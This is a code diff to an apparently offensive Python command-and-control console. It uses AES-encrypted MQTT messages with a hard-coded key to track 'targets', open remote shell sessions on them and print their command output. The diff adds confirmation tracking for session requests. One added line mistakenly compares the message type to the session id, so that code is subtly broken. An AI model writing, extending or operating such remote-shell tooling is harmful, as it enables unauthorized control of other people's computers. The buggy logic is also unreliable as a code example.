@@ -14,6 +14,7 @@ from pick import pick
 current_target = ""
 current_session = ""
 vaild_targets = {}
+await_confirm = []
 
 key = b"fe333581d9f246ee" # get_random_bytes(16)
 cipher = AES.new(key, AES.MODE_CBC)
@@ -46,7 +47,7 @@ def on_connect(client, userdata, flags, rc):
     connected = True
 
 def on_message(client, userdata, msg):
-    global current_target, current_session
+    global current_target, current_session, await_confirm
 
     decrypted_message = decrypt_message(msg.payload.decode("utf-8"), key)
     if decrypted_message is not None:
@@ -55,20 +56,24 @@ def on_message(client, userdata, msg):
             if json_message.get("type") == "status":
                 vaild_targets[json_message.get("client")] = 10
             if json_message.get("type") == "confirm_session":
-                current_session = json_message.get("session_id")
-                publish_json_message(client, topic, {
-                    "type": "start_session",
-                    "target": target,
-                    "session_id": current_session
-                })
-                print("[+] Generating shell")
+                if json_message.get("message_id") in await_confirm:
+                    await_confirm.remove(json_message.get("message_id"))
+                    current_session = json_message.get("session_id")
+                    publish_json_message(client, topic, {
+                        "type": "start_session",
+                        "target": target,
+                        "session_id": current_session
+                    })
+                    print("[+] Generating shell")
             if json_message.get("type") == "cmdoutput":
-                print(json_message.get("output"), end="")
-                sys.stdout.flush()
+                if json_message.get("session_id") == current_session:
+                    print(json_message.get("output"), end="")
+                    sys.stdout.flush()
             if json_message.get("type") == "end_session":
-                current_target = ""
-                current_session = ""
-                print(f"\n\n[-] Session ended\ncontinue>", end="")
+                if json_message.get("type") == current_session:
+                    current_target = ""
+                    current_session = ""
+                    print(f"\n\n[-] Session ended\ncontinue>", end="")
         except json.JSONDecodeError:
             print("[-] Failed to decode JSON from the message")
     else:
@@ -157,6 +162,7 @@ try:
             else:
                 target = option
                 message_id = uuid.uuid4().hex
+                await_confirm.append(message_id)
                 publish_json_message(client, topic, {
                     "type": "new_session",
                     "target": target,
